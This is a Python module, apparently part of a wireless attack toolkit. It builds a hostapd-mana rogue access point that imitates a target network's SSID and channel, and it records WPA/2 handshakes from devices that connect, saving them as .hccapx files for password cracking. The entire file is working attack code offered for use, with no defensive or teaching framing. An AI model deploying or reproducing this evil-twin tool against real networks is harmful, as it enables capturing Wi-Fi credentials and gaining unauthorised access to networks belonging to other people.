import subprocess
import time
import os

def create_rogue_ap_config(folder_name, ap, managed_interface):
  # Creates a configuration file for hostapd-mana if stations are connected.
  abs_folder_name = os.path.abspath(folder_name)
  safe_ssid = ap['SSID'].replace(' ', '_')
  
  config_content = f"""interface={managed_interface}
driver=nl80211
hw_mode=g
channel={ap['Channel']}
ssid={ap['SSID']}
mana_wpaout={abs_folder_name}/{safe_ssid}-handshake.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
"""

  config_file = os.path.join(abs_folder_name, f"{safe_ssid}-sae.conf")
  try:
    with open(config_file, 'w') as f:
      f.write(config_content)
    print(f"Hostapd configuration file created: {config_file}")
    return config_file
  except Exception as e:
    print(f"Error creating Hostapd configuration file: {e}")
    return None

def setup_rogue_ap(config_file):
  # Launches the attack using hostapd-mana and stops the process if a handshake is captured.
  if not config_file:
    return

  try:
    print(f"\nStarting Rogue AP with hostapd-mana...")

    # Using subprocess.Popen to execute the command and capture the output in real time
    process = subprocess.Popen(['hostapd-mana', config_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Read output in real time and display it
    start_time = time.time()
    while True:
      output = process.stdout.readline()
      if output == '' and process.poll() is not None:
        break
      if output:
        print(output.strip())
        
        # Check for handshake capture message
        if "Captured a WPA/2 handshake from" in output:
          print(f"\nHandshake captured! Shutting down Rogue AP (hostapd-mana).")
          process.terminate()
          break
      
      # Timeout after 10 minutes if no handshake captured
      if time.time() - start_time > 600:  # 10 minutes
        print(f"\nTimeout reached (10 minutes). No handshake captured. Stopping Rogue AP.")
        process.terminate()
        break
    
    # Display errors, if any
    stderr = process.stderr.read()
    if stderr:
      print("Errors from hostapd-mana:")
      print(stderr)
    
    return_code = process.poll()
    if return_code != 0:
      print(f"Attack failed with return code: {return_code}")
  except Exception as e:
    print(f"Error during hostapd-mana execution: {e}")
